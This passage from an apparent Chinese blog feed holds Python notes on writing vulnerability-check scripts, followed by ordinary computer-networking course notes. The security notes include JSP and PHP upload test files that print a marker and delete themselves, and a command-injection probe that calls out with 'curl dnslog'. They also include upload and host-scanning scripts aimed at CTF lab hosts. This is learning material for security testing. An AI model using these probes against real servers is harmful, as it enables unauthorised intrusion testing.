class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\nAlltCount：\033[31m%d\033[0m\nVulnCount：\033[32m%d\033[0m&quot;</span> % (<span class="built_in">len</span>(self.urlList), self.findCount))</span><br><span class="line">            self.end = time.time()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Time Spent: %.2f&quot;</span> % (self.end - self.start))</span><br><span class="line">            self.output()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">20</span>, <span class="string">f&quot;\nThe vulnURL has been saved in <span class="subst">&#123;self.outputFile&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    POC()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="文件上传poc"><a href="#文件上传poc" class="headerlink" title="文件上传poc"></a>文件上传poc</h2><ul><li><p>JSP</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(<span class="string">&quot;M2NiYmJmOGJkNjU4MGMyMDBhZTRhYTc2YjliZWIxZjM=&quot;</span>)));<span class="keyword">new</span> <span class="title class_">java</span>.io.File(application.getRealPath(request.getServletPath())).delete();%&gt;</span><br></pre></td></tr></table></figure><blockquote><p>通过调用<code>application.getRealPath(request.getServletPath())</code>来获取当前请求的Servlet路径，并将其转换为真实的文件路径。然后，使用<code>new File()</code>来创建一个表示该文件的File对象，并调用<code>.delete()</code>方法来删除该文件。</p></blockquote></li><li><p>PHP</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;M2NiYmJmOGJkNjU4MGMyMDBhZTRhYTc2YjliZWIxZjM=&quot;</span>);<span class="variable">$file_path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>];<span class="title function_ invoke__">unlink</span>(<span class="variable">$file_path</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="命令执行POC"><a href="#命令执行POC" class="headerlink" title="命令执行POC"></a>命令执行POC</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((8#77777)) # 有回显检测32767</span><br><span class="line">curl dnslog # 能出网检测dnslog</span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>假设上传文件的表单如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">multiple</span>=<span class="string">&quot;true&quot;</span> <span class="attr">required</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>对应脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://e1c9d16a-1928-4d06-8480-e770e3b7a0a8.node4.buuoj.cn:81&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123; name : (文件名,文件内容，文件MIME)  &#125;  将文件信息填入元组（）中，只有文件内容是必选的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传本地文件</span></span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;sess&quot;</span>, <span class="built_in">open</span>(<span class="string">&#x27;D:\phpstudy_pro\phpstudy_pro\Extensions/tmp/tmp/sess_t6c3cbbvj9p0k6njfkso5kmddr&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接上传文件内容字符串（注意要用二进制）</span></span><br><span class="line"><span class="comment"># files = &#123;&quot;file&quot;: (&quot;sess&quot;, b&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;)&#125; </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;direction&#x27;</span>:<span class="string">&#x27;upload&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;attr&#x27;</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url, data=data ,files=files)</span><br></pre></td></tr></table></figure><h2 id="配合burp抓包"><a href="#配合burp抓包" class="headerlink" title="配合burp抓包"></a>配合burp抓包</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pro = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># verify=False不鉴别burp的ssl证书，否则无法代理https</span></span><br><span class="line">requests.get(url=url,proxies=pro, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h2 id="脚本参数"><a href="#脚本参数" class="headerlink" title="脚本参数"></a>脚本参数</h2><p><img src="E:/blog/source/images/image-20230810184821837.png" alt="image-20230810184821837"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python xx.py aa</span><br><span class="line"></span><br><span class="line">sys.argv[<span class="number">0</span>]→xx.py</span><br><span class="line">sys.argv[<span class="number">1</span>]→aa</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-u&quot;</span>,<span class="string">&quot;--url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;target url&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--threads&quot;</span> , <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;threads num&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">&gt;&gt;</span><br><span class="line">python xx.py -u xx.com -t <span class="number">20</span></span><br><span class="line"></span><br><span class="line">args.url=xx.com</span><br><span class="line">args.threads=<span class="number">20</span></span><br></pre></td></tr></table></figure><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"></span><br><span class="line">f= <span class="built_in">open</span>(<span class="string">&#x27;./host.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">url</span>):</span><br><span class="line">    res = requests.get(url=url)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">        f.write(url+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    urls=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">500</span>):</span><br><span class="line">        urls.append(<span class="string">&#x27;http://192-168-1-&#123;&#125;.pvp2039.bugku.cn&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">50</span>) <span class="keyword">as</span> pool:</span><br><span class="line">        <span class="comment"># 提交任务</span></span><br><span class="line">        futures = [pool.submit(get,url) <span class="keyword">for</span> url <span class="keyword">in</span> urls]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 等待所有任务完成</span></span><br><span class="line">        <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(futures):</span><br><span class="line">            result = future.result()</span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置最大并发数量为20</span></span><br><span class="line">max_concurrent = threading.BoundedSemaphore(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;线程执行的函数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> max_concurrent:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url, verify=<span class="literal">False</span>, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 创建并启动线程</span></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> f:</span><br><span class="line">            url = url.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            thread = threading.Thread(target=worker, args=(url,))</span><br><span class="line">            thread.start()</span><br><span class="line">            threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待所有线程结束</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br></pre></td></tr></table></figure><h2 id="关闭ssl告警"><a href="#关闭ssl告警" class="headerlink" title="关闭ssl告警"></a>关闭ssl告警</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用警告</span></span><br><span class="line">warnings.simplefilter(<span class="string">&#x27;ignore&#x27;</span>, category=InsecureRequestWarning)</span><br></pre></td></tr></table></figure><h2 id="颜色变化"><a href="#颜色变化" class="headerlink" title="颜色变化"></a>颜色变化</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> init</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore</span><br><span class="line">init(autoreset=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Fore.GREEN + <span class="string">f&quot;[+]<span class="subst">&#123;url&#125;</span>存在漏洞！！！！&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加载与解码JSON数据：</span><br><span class="line"></span><br><span class="line">json.loads()函数可以将JSON字符串解析为Python对象。</span><br><span class="line">json.load()函数可以从文件中读取JSON数据并解析为Python对象。</span><br><span class="line">编码与保存JSON数据：</span><br><span class="line"></span><br><span class="line">json.dumps()函数可以将Python对象转换为JSON格式的字符串。</span><br><span class="line">json.dump()函数可以将Python对象转换为JSON格式的字符串并写入文件。</span><br><span class="line">操作与访问JSON数据：</span><br><span class="line"></span><br><span class="line">解析后的JSON数据会被转换为相应的Python数据类型，如字典、列表等，可以像操作普通Python对象一样对其进行访问和操作。</span><br><span class="line">处理特殊情况：</span><br><span class="line"></span><br><span class="line">json.JSONEncoder类可以自定义JSON编码器，以处理特殊数据类型或对象的编码。</span><br><span class="line">json.JSONDecoder类可以自定义JSON解码器，以处理特殊的JSON数据格式或特定需求。</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = urljoin(url, path)</span><br></pre></td></tr></table></figure><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul><li><p>requests.exceptions.TooManyRedirects: Exceeded 30 redirects.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allow_redirects=<span class="literal">False</span></span><br></pre></td></tr></table></figure></li><li><p>使用.format<img src="E:/blog/source/images/image-20230824220255340.png" alt="image-20230824220255340"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">字符串里原本就有&#123;&#125;时用其他的字符串格式化</span><br><span class="line"><span class="string">f&quot;<span class="subst">&#123;xx&#125;</span>&quot;</span></span><br><span class="line"><span class="string">f&quot;%s&quot;</span> % xx</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络MOOC</title>
      <link href="/2023/05/01/%E6%B9%96%E7%A7%91%E5%A4%A7mooc/"/>
      <url>/2023/05/01/%E6%B9%96%E7%A7%91%E5%A4%A7mooc/</url>
      
        <content type="html"><![CDATA[<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="因特网发展的三个阶段"><a href="#因特网发展的三个阶段" class="headerlink" title="因特网发展的三个阶段"></a>因特网发展的三个阶段</h3><img src="E:\typora img\image-20221117102953528.png" alt="image-20221117102953528" style="zoom: 67%;" /><h3 id="ISP"><a href="#ISP" class="headerlink" title="ISP"></a>ISP</h3><img src="E:\typora img\image-20221117103120389.png" alt="image-20221117103120389" style="zoom:67%;" /><h3 id="互联网标准制定"><a href="#互联网标准制定" class="headerlink" title="互联网标准制定"></a>互联网标准制定</h3><img src="E:\typora img\image-20220923193359464.png" alt="image-20220923193359464" style="zoom:67%;" /><h3 id="常用的性能指标"><a href="#常用的性能指标" class="headerlink" title="常用的性能指标"></a>常用的性能指标</h3><img src="E:\typora img\image-20220913204558578.png" alt="image-20220913204558578" style="zoom: 67%;" /><ul><li><h5 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h5><blockquote><p>现实生活中的“宽带”</p><p>因为ISP提供的线路带宽使用的单位是bit，而一般下载软件显示的是字节（1字节＝8比特），所以要通过换算，才能得实际值。</p><p>理论上：2M（即2Mb&#x2F;s）宽带理论速率是：256KB&#x2F;s（即2048Kb&#x2F;s），实际速率大约为80–200KB&#x2F;s；</p></blockquote><p>![image-20220915093907863](E:\typora img\image-20220915093907863.png)</p></li><li><p>带宽–发送速率，数据率</p><p>![image-20220923193822220](E:\typora img\image-20220923193822220.png)</p></li><li><p>吞吐量</p><p>实际数据量</p><img src="E:\typora img\image-20220913211017777.png" alt="image-20220913211017777" style="zoom:67%;" /><img src="E:\typora img\image-20220915102810753.png" alt="image-20220915102810753" style="zoom:67%;" /></li><li><p>时延</p><ul><li><p>指数据（一个报文或分组，甚至比特）从网络（或链路）的一端传送到另一端所需的时间。</p></li><li><p>组成</p><img src="E:\typora img\image-20220913211302189.png" alt="image-20220913211302189" style="zoom:67%;" /><img src="E:\typora img\image-20220913211405574.png" alt="image-20220913211405574" style="zoom:67%;" /><img src="E:\typora img\image-20220913211528742.png" alt="image-20220913211528742" style="zoom: 50%;" /><p>信道速率</p><img src="E:\typora img\image-20220913211617635.png" alt="image-20220913211617635" style="zoom:50%;" /><p>注意:</p><blockquote><p>以下说法是错误的：<br>“在高速链路（或高带宽链路）上，比特会传送得更快些”。</p></blockquote></li></ul><blockquote><p>总时延  &#x3D; 处理时延 + 排队时延 + 发送时延 + 传播时延</p><p>上述方法只是提高了数据的发送速率，减少了传播时延。</p></blockquote>  <img src="E:\typora img\image-20220913212738488.png" alt="image-20220913212738488" style="zoom: 67%;" /><ul><li><p>时延与网络利用率</p><img src="E:\typora img\image-20220913212835573.png" alt="image-20220913212835573" style="zoom: 67%;" /><p>例子：假定网络的利用率达到了90%。试估算一下现在的网络时延是它的最小值的多少倍？</p><blockquote><p>D&#x3D;D0&#x2F;(1-U)&#x3D;D0&#x2F;(1-90%)&#x3D;10D0;是最小值的10倍;</p><p>注：网络时延最小值为网络空闲时的时延D0</p></blockquote></li></ul></li><li><p>时延带宽积–链路上的比特数目</p><img src="E:\typora img\image-20220913212303725.png" alt="image-20220913212303725" style="zoom: 67%;" /></li></ul><p><strong>第三章20.假定1km长的CSMA&#x2F;CD网络的数据率为1Gbit&#x2F;s。设信号在网络上的传输速率为200000km&#x2F;s.求能够使用此协议的最短帧长。</strong></p><p>答：对于1km电缆，单程传播时间为1&#x2F;200000&#x3D;5us，来回路程传播时间为10us，为了能够按照CSMA&#x2F;CD工作，最小帧的发射时间不能小于10us，以1GB&#x2F;s速率工作，10us可以发送的比特数等于10*10^-6*10^9&#x3D;10^4s，因此最短帧是10000位或1250字节长</p><p><strong>最短帧长相当于链路上的比特数目</strong></p><ul><li><p>往返时间RTT</p><ul><li>表示从发送方发送完数据，到发送方收到来自接收方的确认总共经历的时间。</li></ul><img src="E:\typora img\image-20220913212539960.png" alt="image-20220913212539960" style="zoom:67%;" /></li></ul><h3 id="协议与服务"><a href="#协议与服务" class="headerlink" title="协议与服务"></a>协议与服务</h3><img src="E:\typora img\image-20220914150912615.png" alt="image-20220914150912615" style="zoom: 67%;" /><ul><li><p>实体 (entity) ：表示任何可发送或接收信息的硬件或软件进程。</p><blockquote><p>比如说软件进程，网卡</p></blockquote></li><li><p>协议：控制两个对等实体进行通信的规则的集合。</p><blockquote><p>对等实体指的是在同一层（对等层）上的实体如上图的A与F就是对等实体。</p><p>控制应用层通信的就是HTPP协议等。</p></blockquote><ul><li><p>三要素</p><blockquote><p>语法：确定通信双方”如何讲”，定义了数据格式，编码和信号电平等。</p><p>语义：确定通信双方”讲什么”，定义了用于协调同步和差错处理等控制信息。</p><p>同步：确定通信双方”讲话的次序”，定义了速度匹配和排序等。</p></blockquote></li><li><p>协议与服务</p><img src="E:\typora img\image-20220914153141106.png" alt="image-20220914153141106" style="zoom:67%;" /><blockquote><p>二者是相互依存的。（注意最底层物理层的不同之处。）</p><p>要实现本层协议，需要使用下层所提供的服务（通过服务原语获得）</p><p>在协议的控制下，两个对等实体间的通信使得本层能够向上一层提供服务。</p></blockquote><p>所以协议是“水平的”，服务是“垂直的”，实体看得见相邻下层所提供的服务，但并不知道实现该服务的具体协议。也就是说，下面的协议对上面的实体是”透明”的。</p></li></ul></li><li><p>SDU</p><blockquote><p>层与层之间交换的数据的单位称为<strong>服务数据单元</strong> SDU </p></blockquote></li><li><p>PDU</p><blockquote><p>对等层次之间传送的数据包称为该层的<strong>协议数据单元</strong>。</p></blockquote></li><li><p>服务访问点</p><blockquote><p>在同一系统中相邻两层的实体交换信息的逻辑接口，用于区分不同的服务类型。</p></blockquote><ul><li>数据链路层的服务访问点为帧的“类型”字段。</li><li>网络层的服务访问点为IP数据报首部中的“协议字段”。运输层的服务访问点为“端口号”。</li></ul></li></ul><h3 id="计算机网络体系结构"><a href="#计算机网络体系结构" class="headerlink" title="计算机网络体系结构"></a>计算机网络体系结构</h3><p><img src="/../images/image-20231006153941570.png" alt="image-20231006153941570"></p><p><img src="/../images/image-20231006154014303.png" alt="image-20231006154014303"></p><img src="E:\typora img\image-20220914162928366.png" alt="image-20220914162928366" style="zoom: 50%;" /><h3 id="复用和分用"><a href="#复用和分用" class="headerlink" title="复用和分用"></a>复用和分用</h3><blockquote><p>一般来说，应用层会有比较多的进程同时在运行，同时和外部网络有数据的交互，就好比一条道路有多个车道有车辆在行驶。</p><p>可是在底层，数据传输是串行的，也就是单车道。</p><p>当多车道的车要经过单车道，采取的方法是在单车道入口设立卡子，每个车道的车在卡子前排队，依次通过卡子进入单车道。</p><p>排队的过程就是复用（多 → 一），反之就是分用或者叫解复用（一 → 多）</p></blockquote><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h4 id="物理层基本概念"><a href="#物理层基本概念" class="headerlink" title="物理层基本概念"></a>物理层基本概念</h4><ul><li><p>作用</p><blockquote><p>在连接各种计算机的传输媒体上传输数据比特流。</p><p>注意：传输媒体不属于计算机网络体系结构（网络体系结构：网络各层及其协议的集合），相当于第0层即物理层的下一层。</p></blockquote></li><li><p>特点</p><ul><li><p>机械特性</p><blockquote><p>指明传输媒体的各种规格</p></blockquote></li><li><p>电气特性</p><blockquote><p>指明接口电缆上的电压范围</p></blockquote></li><li><p>功能特性</p><blockquote><p>指明接口电缆各条信号线（电压范围）的作用</p></blockquote></li><li><p>过程特性</p><blockquote><p>指明每种功能的事件发生顺序</p></blockquote></li></ul></li></ul><h4 id="传输媒体的种类"><a href="#传输媒体的种类" class="headerlink" title="传输媒体的种类"></a>传输媒体的种类</h4><img src="E:\typora img\image-20220918102206140.png" alt="image-20220918102206140" style="zoom: 67%;" /><h4 id="信道复用技术"><a href="#信道复用技术" class="headerlink" title="信道复用技术"></a>信道复用技术</h4><p>目的：</p><blockquote><p>为了通过共享信道,最大限度提高信道利用率。</p></blockquote><ul><li><p>频分复用</p><blockquote><p>用户<strong>同时</strong>占用<strong>不同的频带</strong>资源并行通信</p></blockquote></li><li><p>时分复用</p><blockquote><p>用户<strong>分时</strong>占用<strong>相同的频带</strong>资源并行通信</p></blockquote></li><li><p>波分复用</p><blockquote><p>与频分复用一样，只是传输数据的<strong>介质变为光波</strong></p></blockquote></li><li><p>码分复用</p><blockquote><p>用户<strong>同时</strong>占用<strong>相同的频带</strong>进行通信</p></blockquote><ul><li><p>码片：每个比特时间划分为m个更短的时间片，称为码片（Chip）</p><blockquote><p>某个站要发送比特1，则发送它自己的m比特码片序列</p><p>某个站要发送比特0，则发送它自己的m比特码片序列的反码。</p></blockquote></li><li><p>码片向量</p><blockquote><p>根据码片序列生成。1→1，0→-1</p><p>假设码片序列为110</p><p>则码片向量为（1，1，-1）</p></blockquote></li><li><p>规格化内积</p><img src="E:\typora img\image-20220920111446605.png" alt="image-20220920111446605" style="zoom: 67%;" /><blockquote><p>右式中的Ai，Bi指的是码片向量</p></blockquote><p>![image-20220920111732057](E:\typora img\image-20220920111732057.png)</p><p>生活中的例子</p><img src="E:\typora img\image-20220920111832249.png" alt="image-20220920111832249" style="zoom:67%;" /><img src="E:\typora img\image-20220920111905155.png" alt="image-20220920111905155" style="zoom:50%;" /></li></ul><p>规格化内积得到（1，-1，1）对应的码片序列就是101，即手机A收到比特串101.</p></li></ul><h4 id="码元率与数据率"><a href="#码元率与数据率" class="headerlink" title="码元率与数据率"></a>码元率与数据率</h4><p>奈式准则得到最高码元速率（波特率）为20000码元&#x2F;秒，码元的振幅分为16个等级，即信号状态数（可调制出的不同基本波形或码元数量）为16，则一个码元可携带的比特数量为log216&#x3D;4，所以最高数据率为20000*4比特&#x2F;秒。</p><img src="E:\typora img\image-20221120194830348.png" alt="image-20221120194830348" style="zoom:67%;" /><h4 id="奈式准则和香农公式"><a href="#奈式准则和香农公式" class="headerlink" title="奈式准则和香农公式"></a>奈式准则和香农公式</h4><p>![image-20220920112420614](E:\typora img\image-20220920112420614.png)</p><h5 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">极限信息传输速率==码元传输速率（波特率）*码元携带的比特数</span><br><span class="line">码元携带的比特数：1og2n //n为码元的振幅或者信号状态数（可调制出的不同基本波形或码元数量）</span><br><span class="line">频率＝传播速率/波长</span><br><span class="line">频带宽度=最高频率-最低频率</span><br></pre></td></tr></table></figure><p><strong>第三章16.数据率为10Mb&#x2F;s的以太网在物理媒体上的码元传输速率是多少码元&#x2F;秒？</strong><br>答：码元传输速率即为波特率，以太网使用曼彻斯特编码，这就意味着发送的每一位都有两个信号周期（一个码元携带0.5个比特），因此波特率是数据率的两倍，即20M码元&#x2F;秒</p><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><h5 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h5><img src="E:\typora img\image-20221121103738315.png" alt="image-20221121103738315" style="zoom:80%;" /><p><strong>数据链路层做成可靠的链路层有哪些优点和缺点。</strong></p><blockquote><p>可靠的链路层的优点和缺点取决于所应用的环境：对于干扰严重的信道，可靠的链路层可以将重传范围约束在局部链路，防止全网络的传输效率受损；对于优质信道，采用可靠的链路层会增大资源开销，影响传输效率。</p></blockquote><ul><li><p>透明传输</p><ul><li><p>添加帧首部和帧尾部：帧定界符，为了区分比特流中的帧</p></li><li><p>区分载荷中的数据与帧定界符和控制符：ESC（控制符）+FLAG（帧定界符）</p><img src="E:\typora img\image-20220924133355678.png" alt="image-20220924133355678" style="zoom:50%;" /><blockquote><p>字符填充法：在字符前加上转义字符ESC（11100000）</p><p>零比特填充法：每五个连续比特1后面插入一个比特0</p></blockquote></li></ul></li><li><p>差错控制</p><p>目的：为了检测比特在传输过程中是否产生误码（比特差错）。</p><p>如何检测：</p><ul><li>奇偶校验</li></ul><img src="E:\typora img\image-20221121104553471.png" alt="image-20221121104553471" style="zoom: 80%;" /><ul><li><p>CRC（循环冗余校验）</p><img src="E:\typora img\image-20220924135839068.png" alt="image-20220924135839068" style="zoom: 80%;" /><img src="E:\typora img\image-20220924135854287.png" alt="image-20220924135854287" style="zoom: 80%;" /></li></ul></li><li><p>可靠传输</p><blockquote><p>保证接收方能够正确收到发送方发送的所有数据。·</p></blockquote><ul><li><p>传输中出现的差错</p><ul><li><p>误码：比特错误。</p></li><li><p>丢失：路由器的输入队列满时，会主动丢弃数据分组，亦或是接收方收到了重复的数据分组时。</p></li><li><p>乱序：数据分组通过不同的路由路径，导致到达接收方的时间不同。</p></li><li><p>重复：数据分组通过的路由路径堵塞，导致发送方没有及时收到确认分组，亦或是确认分组在传输的过程</p><p>中丢失，发送方就会超时重发。</p></li></ul></li><li><p>机制</p><ul><li>否认机制：当接收方收到数据并进行差错检测后，如果发现出现数据误码，就向发送方发送否认分组，以让发送方重发数据。</li></ul></li><li><p>超时重发机制：发送方发送数据后，就开始计时RTO，如果超过RTO时间还没有接收到确认&#x2F;否认分组，就自动重发对应的数据分组。</p><ul><li>滑动窗口机制：发送窗口和接收窗口的大小决定了一次能够发送或接收数据分组的最大数量，并且只有成功发送或接收窗口大小的数据分组，才能够滑动窗口，即才能够发送或接收下一次的数据分组。</li></ul></li></ul></li><li><p>传输协议</p><ul><li><p>停止-等待传输协议</p><blockquote><p>使用超时重发机制，每次只发送一个数据分组。</p></blockquote></li></ul><blockquote></blockquote><pre><code>&gt; 并使用1bit来标记分组序号来防止数据重复差错。&lt;img src=&quot;E:\typora img\image-20220924135602244.png&quot; alt=&quot;image-20220924135602244&quot; style=&quot;zoom: 67%;&quot; /&gt;</code></pre><ul><li><p>回退N帧协议</p><blockquote><p>使用滑动窗口机制。</p></blockquote></li></ul><blockquote></blockquote><pre><code>&gt; 发送方发送数据分组的个数取决于发送窗口的大小。&gt;&gt; 接收方接收数据分组的个数默认为1，即接收窗口的大小默认为1。&gt;&gt; 假设传输数据0，1，2，3，4，数据分组2出错，&gt;&gt; 那么发送方就要回退到第2帧，重新发送数据分组2，3，4。</code></pre><ul><li><p>选择重传协议</p><blockquote><p>使用滑动窗口机制。</p></blockquote></li></ul><blockquote></blockquote><pre><code>&gt; 发送窗口和接收窗口大小一致。&gt;&gt; 假设传输数据0，1，2，3，4，数据分组2出错，&gt;&gt; 那么发送方只需要重新发送数据分组2。</code></pre><p>​</p></li></ul><h3 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h3><h5 id="集线器共享式以太网"><a href="#集线器共享式以太网" class="headerlink" title="集线器共享式以太网"></a>集线器共享式以太网</h5><img src="E:\typora img\image-20221121125017133.png" alt="image-20221121125017133" style="zoom: 67%;" /><img src="E:\typora img\image-20221121125038156.png" alt="image-20221121125038156" style="zoom:67%;" /><h5 id="交换机交换式以太网"><a href="#交换机交换式以太网" class="headerlink" title="交换机交换式以太网"></a>交换机交换式以太网</h5><blockquote><p>交换机自学习</p><p>A→B</p><p>从A发出的帧到达交换机后，交换记录下该帧的源MAC地址即主机A的MAC地址和帧到达的交换机接口，并在交换机的记录表中查找帧中的目的MAC地址，从而精确转发或者盲目转发。</p></blockquote><img src="E:\typora img\image-20221121123350885.png" alt="image-20221121123350885" style="zoom: 67%;" /><img src="E:\typora img\image-20221121123637951.png" alt="image-20221121123637951" style="zoom: 67%;" /><img src="E:\typora img\image-20221121124516325.png" alt="image-20221121124516325" style="zoom: 67%;" /><h5 id="集线器，交换机与带宽"><a href="#集线器，交换机与带宽" class="headerlink" title="集线器，交换机与带宽"></a>集线器，交换机与带宽</h5><p><a 